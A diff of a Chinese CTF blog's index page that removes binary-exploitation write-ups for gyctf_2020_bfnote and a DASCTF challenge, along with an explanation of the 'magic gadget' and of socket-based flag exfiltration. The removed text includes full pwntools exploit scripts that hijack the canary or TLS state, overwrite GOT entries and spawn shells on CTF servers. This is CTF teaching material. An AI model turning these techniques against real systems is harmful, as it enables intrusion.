@@ -125,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-count">96</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -136,7 +136,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">100</span>
+        <span class="site-state-item-count">99</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -153,238 +153,6 @@
     </div>
 
     <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/2d29ef23.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
-      <meta itemprop="name" content="ZIKH26">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ZIKH26's Blog">
-      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | ZIKH26's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/2d29ef23.html" class="post-title-link" itemprop="url">gyctf_2020_bfnote</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-11-30 21:55:02" itemprop="dateModified" datetime="2022-11-30T21:55:02+08:00">2022-11-30</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/buu%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">buu刷题</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本题的学习与总结有:</p>
-<ol>
-<li>本题与starctf2018_babystack这题一样，考察的都是篡改TLS中的stack_guard从而绕过canary的检查，因为在2.23和2.27 32位的glibc里面主线程的TLS是位于mmap映射出来的内存，并且位置固定并不随机。而本题可以通过数组索引无限制，而在mmap映射出来的区域精准的修改某个内存，这就给了篡改TLS中的stack_guard的机会</li>
-<li>本题的难点在于之后绕过canary，无法正常的泄露libc地址，从而造成了一定难度，通过学习网上各位师傅的wp，发现本题一共有三种做法，分别是利用magic gadget篡改got表，ret2dl以及攻击IO_FILE。这里我采用的是利用magic gadget篡改got表</li>
-</ol>
-<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h2><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281654944.png" alt="image-20221128165410736" style="zoom:50%;" />
-
-<h2 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281657108.png" alt="image-20221128165734005"></p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>我们现在拥有栈溢出控制执行流的机会，以及利用索引无限制任意地址写的机会。</p>
-<p>先说如何劫持TLS里的stack_guard来绕过canary</p>
-<ol>
-<li>先利用malloc申请一个超大内存，观察一下mmap映射出来的地址和TLS中stack_guard的距离</li>
-<li>在最后的数组索引无限制的read里去篡改stack_guard保持其和栈里覆盖掉的canary一样即可</li>
-</ol>
-<p>如图</p>
-<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281712774.png" alt="image-20221128171243112" style="zoom:50%;" />
-
-<p>考虑到在数组里索引又被加了0x10，所以最后实际的偏移应该为0x5170c-0x10，这样即可篡改stack_guard(如下)</p>
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281714096.png" alt="image-20221128171415975"></p>
-<p>由于本题的保护是parital relro，可以篡改got表。并且libc地址的后三位是固定不变的，其实我们可以打一个rop去read往atol的got表里读入数据(atol和system的真实地址只有后五位不一样)如下</p>
-<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281718462.png" alt="image-20221128171802376" style="zoom:50%;" />
-
-<p>所以我们可以直接去read读入数据控制atol的后两位为system的地址，此时也仅仅有三位不一样了，到这里爆破一下的话也有1&#x2F;4096的概率(如果实在没办法的话，爆破一下也不是不行)。</p>
-<p>但是我们去观察一下可用的gadget发现了这个inc指令(如下)</p>
-<blockquote>
-<p>inc b相当于add b,1，速度比add指令更快</p>
-</blockquote>
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281720294.png" alt="image-20221128172035296"></p>
-<p>同时看了一下关于ebp的gadget发现能够控制ebp(如下)</p>
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281722465.png" alt="image-20221128172221197"></p>
-<p>这就意味着我们能利用那段magic gadget来让指定的内存加1，因为紧跟ret的存在，所以能够不断执行这段gadget，而atol和system除去末尾的三位固定外，前面的部分虽然随机但是却存在固定的偏移，我们可以控制ebp-0x17fa8b40为atol函数的第三字节的地址，不断的执行inc指令，最终加到和system一样的值。</p>
-<p>篡改成功后让执行流迁移到0x08048656这个地址，read读入&#x2F;bin&#x2F;sh调用atol的时候获取shell。</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26281&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x0804882A</span>,<span class="number">0x08048907</span>,<span class="number">0x080487BA</span>,<span class="number">0x8048973</span>)</span><br><span class="line">leave_ret=<span class="number">0x08048578</span></span><br><span class="line">inc_ebp=<span class="number">0x08048434</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x32</span>+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A060</span>+<span class="number">4</span>)+p32(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your description : &quot;</span>,payload)</span><br><span class="line">payload=p32(<span class="number">0x080489db</span>)+p32(<span class="number">0x804a02d</span>+<span class="number">0x17fa8b40</span>)+p32(inc_ebp)*<span class="number">0xd9</span><span class="comment">#0xdb</span></span><br><span class="line">payload+=p32(e.plt[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">0x08048656</span>)+p32(<span class="number">0</span>)+p32(e.got[<span class="string">&#x27;atol&#x27;</span>])+p32(<span class="number">0x100</span>)+p32(<span class="number">0x08048656</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your postscript : &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your notebook size : &quot;</span>,<span class="built_in">str</span>(<span class="number">0x50000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your title size : &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5170c</span>-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;invalid ! please re-enter :\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your title : &quot;</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your note : &quot;</span>,p32(<span class="number">0xdeadbeef</span>))<span class="comment">#canary</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281741828.png" alt="image-20221128174103440"></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/countfatcode/p/12425168.html">i春秋公益赛之BFnote - countfatcode - 博客园 (cnblogs.com)</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/3aec74c5.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
-      <meta itemprop="name" content="ZIKH26">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ZIKH26's Blog">
-      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | ZIKH26's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/3aec74c5.html" class="post-title-link" itemprop="url">good_luck_2022DASCTF Apr X FATE 防疫挑战赛</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有：</p>
-<p>1、学习了格式化字符串漏洞中的%s泄露函数地址原理以及roderick师傅写的Libcbox的用法（其实用法也很简单了），之后就没什么了直接ret2libc就打了。</p>
-<p>2、这道赛题最后只有三解… 不过真的很简单，做出来的人很少的原因估计是因为这道题是比赛还有不到两个小时结束，才把正确的程序放出来（之前放的都是错误的…）。</p>
-<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220424083159297-1342905454.png"></p>
-<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/../img/2706180-20220424083208729-652924904.png"></p>
-<p><img src="/../img/2706180-20220424083214353-1731248574.png"></p>
-<p>程序逻辑非常简单，刚开始是time加srand加rand。看一下汇编代码发现没有办法覆盖种子，因此这里生成的就是一个不可控随机数。比赛刚开始的时候，程序放出来的是rand%200，因此进入fmt和overflow函数还需要进行爆破。不过现在这个就非常简单了，要么随机数是0要么随机数是1,0进入overflow,1进入fmt函数。</p>
-<p><img src="/../img/2706180-20220424083219157-376928583.png"></p>
-<p>发现这两个函数都存在溢出，并且fmt函数中存在格式化字符串漏洞。由于程序没有开canary。那直接ret2libc？这样的话这个格式化字符串漏洞岂不是就没有意义了？先不管这么多，脚本写了再说。</p>
-<p>写完之后发现打不通（之前写ret2libc的脚本给删了，这里就不再呈现了），通过调试发现，pop rdi的地址中出现了0a，把输出给截断了… 这意味着我们无法使用程序里的pop rdi。这样的话就没法泄露函数（毕竟我们连rdi寄存器都控制不了）</p>
-<p>然后考虑一下给的格式化字符串漏洞，我们可以用它来泄露栈中存放的函数真实地址，利用溢出来劫持程序执行流。</p>
-<p>泄露的话有两种方法，第一种是用%p泄露，第二种是用%s泄露。之前一直不清楚它们的区别，请教了roderick师傅之后总算是清楚了。</p>
-<p>以printf(“%s”，”aaaa”)为例 	printf的第二个参数装的并不是aaaa这四个字符，而是aaaa字符串的首地址。可是最后打印出来的并不是aaaa字符串的首地址，而是这个地址所指向的字符串。由此可以推断出，%s有寻址的功能。</p>
-<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>思路重新回到泄露栈中的函数真实地址，先说第一种%p进行泄露。</p>
-<p><img src="/../img/2706180-20220424083227872-1671747977.png"></p>
-<p>栈顶偏移25(0x13+6),因此直接%25$p即可。不过这样泄露出来的地址还需要减去362，因为现在得到的是puts+362，而我们仅仅要的是puts的真实地址。这样的缺点就是程序patch不同的libc，这个偏移是不一样的。以本题为例，题目并没有给出libc.so因此这个偏移我们是无法确定的(现在看到的只是我们本地的偏移，远程可能并不一样)。</p>
-<p>不过这个方法有一定的运气成分在这里面，我猜这个版本不会太高（我本机是2.27的，当时本地通了远程没通，就知道肯定是libc patch的有问题），就从2.23开始patch libc。结果patch第一个2.23-0ubuntu11.3_amd64就被我给猜对了（服务器那边用的也是这个libc）。</p>
-<p>这个libc蒙对之后，由于基地址也泄露出来了，剩下的就简单多了，本地怎么打，远程就怎么打(不过讲这个方法感觉没什么意义，毕竟这是靠运气（不过如果远程给了Libc的话这个方法是可以用的）主要我确实是用这个方法打通了，因此记录一下)</p>
-<h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/hacker/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">    fmt_addr = <span class="number">0x400836</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;fmt\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%25$p&#x27;</span> + (<span class="number">0x78</span> - <span class="number">5</span>) * <span class="string">&#x27;a&#x27;</span> + p64(fmt_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr1---------------&gt;&#x27;</span>, <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    libc_base = leak_addr - <span class="number">362</span> - <span class="number">0x6F6A0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    pop_rdi_addr = <span class="number">0x21112</span> + libc_base</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    ret = <span class="number">0x400679</span></span><br><span class="line">    payload = <span class="number">0x78</span> * <span class="string">&#x27;b&#x27;</span></span><br><span class="line">    payload+=p64(ret)+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
-<p>这个打通概率是二分之一，因为如果第一次进到overflow就不通了。<br><img src="/../img/2706180-20220424083229618-61437671.png"></p>
-<p>第二种用%s来泄露就靠谱多了，我们在栈中布置puts的got地址，利用%s的寻址特征，来达到直接泄露puts的真实地址（也就是不会再受libc版本导致偏移不同的影响），依旧利用溢出来劫持程序执行流。</p>
-<p>只需要输入%7$saaaa’ + p64(puts_got_addr)然后填垃圾数据垫到返回地址处劫持执行流即可。</p>
-<p>这里泄露是很方便，但是我用LibcSearcher搜不到对应正确的libc版本。可以用<a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts:680&l=libc6-amd64_2.10.1-0ubuntu15_i386">在线搜libc的网站搜</a>对应的Libc版本</p>
-<p>也可以用Roderick师傅写的<a target="_blank" rel="noopener" href="https://github.com/RoderickChan/pwncli">pwncli</a>中的LibcBox来搜，这个LibcBox写的确实很棒</p>
-<p>下面是LibcBox搜索的效果图</p>
-<p><img src="/../img/2706180-20220424083235121-282534386.png"></p>
-<p>它搜到了十个版本的libc，但是LibcSearcher我记的仅仅是搜到了三个（不排除是我的LibcSearcher有问题）。</p>
-<p>泄露出了libc基地址，那就随便打了，不过好像没法搜pop_rdi这个指令（不过可以把libc下载下来用Ropgadget来搜，不过有点麻烦），就直接用one_gadget打了(pwncli这个库模式只支持python3)</p>
-<h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    over_flow = <span class="number">0x400836</span></span><br><span class="line">    puts_got_addr = <span class="number">0x601018</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;fmt\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%7$saaaa&#x27;</span> + p64(puts_got_addr) + (<span class="number">0x78</span> - <span class="number">16</span>) * <span class="string">b&#x27;a&#x27;</span> + p64(over_flow)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#用%s泄露出来的地址应该用u64来接收</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;puts_addr---------------&gt;&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    lb = LibcBox()</span><br><span class="line">    lb.add_symbol(<span class="string">&#x27;puts&#x27;</span>, puts_addr)<span class="comment">#这个地方跟libcsearcher用法基本一样，下面也是去dump出来</span></span><br><span class="line">    lb.search(download_so=<span class="number">1</span>)</span><br><span class="line">    libc_base = puts_addr - lb.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    one_addr = <span class="number">0xf03a4</span> + libc_base</span><br><span class="line">    payload = <span class="number">0x78</span> * <span class="string">b&#x27;b&#x27;</span> + p64(one_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
 
     
 
@@ -430,7 +198,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 19:35:22" itemprop="dateModified" datetime="2023-07-01T19:35:22+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -452,159 +220,19 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>通过这道题的学习与总结：</p>
+          <p>通过这道题的学习与总结：</p>
 <p>1、rep指令是进行循环，movs qword ptr [rdi],qword ptr[rsi]则可以拷贝，二者结合就是可以大规模拷贝数据到另一个内存空间。而想实现它，仅仅只需要控制rdi和rsi以及rcx寄存器即可。</p>
 <p>2、我们往可读可写可执行的内存中写入的任何机器码都是可以被当做指令来执行的，而想执行这些指令，仅仅用ret或者call跳转到这些指令所在地址即可<strong>（ret和call要的是指令所在地址，并非指令）</strong></p>
 <p>3、关闭标准输出，没有回显时，可以利用magic_gadget来去获取一些我们需要的函数。</p>
 <p>4、开启沙箱并且三个文件描述符全关时（意味着orw读取的flag也无法看见），可以用socket+connect将flag发送到这个新开的文件上（毕竟close关闭的仅仅是当前终端的0,1,2)</p>
-<h1 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h1><p><img src="/../img/2706180-20220426101917635-1568812321.png"></p>
-<p><img src="/../img/2706180-20220426101928743-1588465175.png"></p>
-<h2 id="canary开了，就没法直接溢出？"><a href="#canary开了，就没法直接溢出？" class="headerlink" title="canary开了，就没法直接溢出？"></a>canary开了，就没法直接溢出？</h2><p>此时来到的要讲的第一点，checksec是检测出了canary的，但是用gdb调试之后发现，并没有看见canary（如下图），而返回地址是直接被垃圾数据覆盖了。</p>
-<p><img src="/../img/2706180-20220426101943521-1024948707.png"></p>
-<p>这是因为出题人编译程序的时候只使用了 fstack-protector  选项，而非使用的 fstack-protector-all  。</p>
-<p>简单来说， <strong>fstack-protector-all  选项会对每一个函数都插入一个canary的值，但缺点是会增加很多额外的栈空间</strong>，增加程序体积。<strong>而开启了fstack-protector  选项则是在具有局部数组变量的函数（数组大小超过八字节）才会插入canary，缺点是保护能力有限</strong>。</p>
-<p>了解了上述内容后，开启fstack-protector  选项就会出现这种情况，如果是定义的int类型的变量，而后面又使用了输入函数从这个变量开始写入字节且**<font color=red>输入函数写入的字节大于了变量类型的字节数</font>，就会出现检查的时候明明有canary保护，但是依旧可以正常溢出的这种情况**（如下图）。</p>
-<p><img src="/../img/2706180-20220426101952307-600170163.png"></p>
-<h1 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h1><p>程序整体流程非常简单，存在0x1b0的溢出。然后close函数关闭了标准输入、标准输出、标准错误，<strong>就是程序没回显且无法多次输入</strong>。另外开了沙箱保护，无法执行execve来获取shell。那orw?可是标准输出也被关了（之前也做过关闭文件描述符的，不过那几道都没有把文件描述符全部关闭，因此获取shell的时候重定向一下文件描述符就ok了，不过这道题三个描述符全关，没办法重定向文件描述符）</p>
-<p>因此这道题采用的对抗策略是一种特殊的orw，使用socket+connect+orw。即创建一个套接字然后connect与一个ip和端口所绑定，再orw，读取flag，将flag打印到新开的socket上，下面仔细讲一下这些都是个什么东西。</p>
-<h1 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h1><h3 id="socket函数和connect函数咋理解？"><a href="#socket函数和connect函数咋理解？" class="headerlink" title="socket函数和connect函数咋理解？"></a>socket函数和connect函数咋理解？</h3><p>具体解释的话可以看一下官方文档，我谈一下自己的理解。(这两个函数布置参数时，需要注意的地方，我做了相关解释，都放在了文末)</p>
-<p><strong>socket函数就是去创建一个套接字</strong>（这个套接字很抽象，不过linux中万物皆文件，我就先试着把它理解为一个文件），如果单独使用的话，它仅仅会创建和声明一下这个’文件’的特征，然后返回一个文件描述符（指向了创建的这个文件）。但此时它还是个空壳子，并没有灵魂。</p>
-<p><strong>而connect函数的作用就是赋予刚刚那个空壳子灵魂</strong>，也就是<strong>将网络的地址与这个文件联系起来</strong>。使用connect函数之后，网络的一个地址及端口就算与socket绑定了,此时发送到socket上的数据就发到了与其绑定的ip的端口上。</p>
-<p>也就是说现在的大致思路出来了，但是有很多地方的细节问题还要解决，因为程序里没有socket函数和connect函数，但现在还需要使用，那我们只能去系统调用。</p>
-<p><img src="/../img/2706180-20220426102004222-1183097211.png"></p>
-<p>没有syscall…   不过我们可以利用magic gadget造一个出来</p>
-<h1 id="magic-gadget"><a href="#magic-gadget" class="headerlink" title="magic gadget"></a>magic gadget</h1><h2 id="什么是magic-gadget？"><a href="#什么是magic-gadget？" class="headerlink" title="什么是magic gadget？"></a>什么是magic gadget？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure>
-
-<p>magic gadget似乎是一种统称？就是上面这种神奇的小玩意，师傅们都叫它magic gadget，似乎并不单指某个gadgets，因为前一段做<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>的时候，碰见了另一个magic_gadgets。</p>
-<h2 id="magic-gadget它有什么用？"><a href="#magic-gadget它有什么用？" class="headerlink" title="magic gadget它有什么用？"></a>magic gadget它有什么用？</h2><p>这个gadget的核心就在于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br></pre></td></tr></table></figure>
-
-<p>可以看出来它可以去修改ebp-0x3d所指向的内容，<strong>只要我们能够控制rbp和ebx，那就可以去修改任意地址的任意值了</strong>（我们可以借此来实现修改got表，或者是往bss段写任意数据）</p>
-<h2 id="magic-gadget应该怎么去利用？"><a href="#magic-gadget应该怎么去利用？" class="headerlink" title="magic gadget应该怎么去利用？"></a>magic gadget应该怎么去利用？</h2><p>首先我们要想办法控制rbp和ebx的值，这一点我们可以通过程序中的csu片段来做到。</p>
-<h3 id="先说修改got表"><a href="#先说修改got表" class="headerlink" title="先说修改got表"></a>先说修改got表</h3><p>既然add增加的是rbp-0x3d所指向的数据，而ebx又是增加的值，我就以这道题获取syscall的方法为例说明一下。</p>
-<p>由于在alarm函数里syscall距离alarm函数的真实地址偏移仅仅为5，那岂不是说我<strong>ebx存一个5，然后让rbp-0x3d为alarm的got地址，执行magic gadget就可以修改alarm的got表为syscall的真实地址</strong>。如此我们再执行alarm函数的时候，就相当于执行的是syscall。</p>
-<blockquote>
-<p>此时这里就有一个坑，想执行syscall的时候，我应该用alarm的got地址还是plt地址？ 答案放在了文末</p>
-</blockquote>
-<h3 id="再说往bss段中任意写入数据"><a href="#再说往bss段中任意写入数据" class="headerlink" title="再说往bss段中任意写入数据"></a>再说往bss段中任意写入数据</h3><p>其实说写入数据就应该想到一个疑问，add指令是进行加法，咋就能直接去写入<strong>任意</strong>数据了，如果rbp-0x3d指向的位置原本就有数据，还能任意写？</p>
-<p>答案是不能的，这只是一个magic gadget，又不是一个无敌gadget，指令确实只能相加，可注意审题，我说的是<strong>往bss段任意写入数据</strong>。bss段有什么特点？<strong>它属于静态内存分配，程序一开始就会对这个段进行清零</strong>。既然<strong>bss段里面都是0，那就相当于我不管add什么，都是相当于我往里面写了什么</strong>。因此用magic gadget在对bss段进行操作的时候，是可以达到任意地址任意写的（不过值得一提的是，<strong>由于偏移是放在ebp中的，因此在64位程序里面，用magic gadget写的时候，一次只能写入四个字节</strong>）</p>
-<h2 id="寻找magic-gadget"><a href="#寻找magic-gadget" class="headerlink" title="寻找magic gadget"></a>寻找magic gadget</h2><p>这个神奇的小东西存在于__do_global_dtors_au这个函数中，它是gcc编译器自身的一个函数，作用是析构函数。但是<strong>在ida查看会发现这段gadget并不存在，但是可以通过将机器码错位得到我们想要的gadget</strong>。</p>
-<p><img src="/../img/2706180-20220426102017372-286472307.png"></p>
